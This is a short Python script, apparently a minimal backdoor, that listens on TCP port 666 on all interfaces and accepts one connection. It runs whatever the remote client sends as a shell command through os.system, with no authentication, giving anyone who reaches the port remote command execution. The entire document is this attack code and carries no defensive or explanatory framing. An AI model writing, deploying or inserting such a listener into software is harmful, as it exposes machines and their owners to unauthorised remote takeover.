import socket
import os
#Socket creation
connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Binding Port
connexion.bind(('',666))

#Listening on the port
connexion.listen(5)

#Waiting for a connection
client_connexion, client_infos = connexion.accept()

#Receiving request from the client
msg = client_connexion.recv(1024)

#Executing request
os.system(msg)
